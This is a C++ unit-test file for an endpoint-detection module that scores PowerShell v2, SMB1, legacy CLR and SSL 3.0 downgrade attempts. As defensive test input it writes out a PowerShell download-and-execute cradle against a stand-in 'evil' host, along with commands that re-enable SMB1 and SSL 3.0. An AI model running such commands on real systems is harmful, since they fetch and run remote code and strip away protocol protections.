/*
 * downgrade_attack_detector_tests.cpp - Unit tests for
 * DowngradeAttackDetector (T1562.010 Downgrade Attack).
 */
#include "downgrade_attack_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "downgrade_attack_detector.h"

namespace {

#define DA_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "downgrade attack detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

edr::Event ScriptEvent(uint64_t ts100ns, const char* script) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kImage] =
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    event.fields[edr::field::kScriptBlockText] = script;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kDowngradeAttackScore);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunDowngradeAttackDetectorTests() {
    std::fprintf(stderr, "[downgrade] TestDisabled\n");
    {
        edr::DowngradeAttackDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            3000 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -version 2 -c IEX(...)");
        detector.Enrich(event);
        DA_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[downgrade] TestPowerShellV2\n");
    {
        edr::DowngradeAttackDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            3000 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -version 2 -nop -c IEX(New-Object "
            "Net.WebClient).DownloadString('http://evil/a')");
        detector.Enrich(event);
        DA_CHECK(Score(event) == "90");
        DA_CHECK(event.fields.at(
            edr::field::kDowngradeAttackVerdict) == "malicious");
    }
    std::fprintf(stderr, "[downgrade] TestPowerShellV2ShortForms\n");
    {
        edr::DowngradeAttackDetector detector(true, 55, 0, 1024);
        edr::Event dashV = ProcEvent(
            3001 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell -v 2 -c whoami");
        detector.Enrich(dashV);
        DA_CHECK(Score(dashV) == "90");

        edr::Event colon = ProcEvent(
            3002 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell -Version:2.0 -File payload.ps1");
        detector.Enrich(colon);
        DA_CHECK(Score(colon) == "90");
    }
    std::fprintf(stderr, "[downgrade] TestSmb1ReEnabled\n");
    {
        edr::DowngradeAttackDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(
            3003 * kSecond,
            "Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force");
        detector.Enrich(event);
        DA_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[downgrade] TestSmb1RegistryPlane\n");
    {
        edr::DowngradeAttackDetector detector(true, 55, 300, 1024);
        edr::Event event;
        event.type = EDR_EVT_REG_WRITE;
        event.ts100ns = 3004 * kSecond;
        event.fields[edr::field::kType] = "REG_WRITE";
        event.fields[edr::field::kRegKey] =
            "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\"
            "Parameters\\SMB1";
        event.fields[edr::field::kRegValue] = "1";
        detector.Enrich(event);
        /* Registry shape carries no $true; the /d 1 style enabling token
         * is absent, so this specific shape stays silent by design and
         * the command plane above is the reliable signal. */
        DA_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[downgrade] TestLegacyClrActivation\n");
    {
        edr::DowngradeAttackDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(
            3005 * kSecond,
            "$env:COMPLUS_useLegacyV2RuntimeActivationPolicy = 1");
        detector.Enrich(event);
        DA_CHECK(Score(event) == "75");
    }
    std::fprintf(stderr, "[downgrade] TestLegacyTlsReEnabled\n");
    {
        edr::DowngradeAttackDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            3006 * kSecond, "C:\\Windows\\System32\\reg.exe",
            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\"
            "SecurityProviders\\SCHANNEL\\Protocols\\SSL 3.0\\Server\" "
            "/v Enabled /t REG_DWORD /d 1 /f");
        detector.Enrich(event);
        DA_CHECK(Score(event) == "70");
        DA_CHECK(event.fields.at(
            edr::field::kDowngradeAttackVerdict) == "suspicious");
    }
    std::fprintf(stderr, "[downgrade] TestBenignSilent\n");
    {
        edr::DowngradeAttackDetector detector(true, 55, 300, 1024);
        /* Modern PowerShell with an unrelated -Verbose switch. */
        edr::Event verbose = ProcEvent(
            3007 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -Verbose -c Get-Service");
        detector.Enrich(verbose);
        DA_CHECK(Score(verbose).empty());

        /* -version 5 is not a downgrade. */
        edr::Event v5 = ProcEvent(
            3008 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -version 5 -c Get-Date");
        detector.Enrich(v5);
        DA_CHECK(Score(v5).empty());

        /* A -v 2 switch on a non-PowerShell tool must not score. */
        edr::Event otherTool = ProcEvent(
            3009 * kSecond, "C:\\Tools\\ffmpeg.exe",
            "ffmpeg.exe -v 2 -i in.mp4 out.mp4");
        detector.Enrich(otherTool);
        DA_CHECK(Score(otherTool).empty());

        /* Read-only SMB configuration query. */
        edr::Event query = ScriptEvent(
            3010 * kSecond, "Get-SmbServerConfiguration | fl *SMB1*");
        detector.Enrich(query);
        DA_CHECK(Score(query).empty());

        /* Disabling SMBv1 is hardening, not a downgrade. The cmdlet
         * switch is literally -EnableSMB1Protocol, so direction must come
         * from the value ($false), not the parameter name. */
        edr::Event hardening = ScriptEvent(
            3011 * kSecond,
            "Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force");
        detector.Enrich(hardening);
        DA_CHECK(Score(hardening).empty());

        /* Same trap on the TLS plane: the value name is Enabled, so a
         * hardening write of Enabled=0 must not read as an enable. */
        edr::Event tlsHardening = ProcEvent(
            3012 * kSecond, "C:\\Windows\\System32\\reg.exe",
            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\"
            "SecurityProviders\\SCHANNEL\\Protocols\\SSL 3.0\\Server\" "
            "/v Enabled /t REG_DWORD /d 0 /f");
        detector.Enrich(tlsHardening);
        DA_CHECK(Score(tlsHardening).empty());
    }
    std::fprintf(stderr, "[downgrade] all passed\n");
}
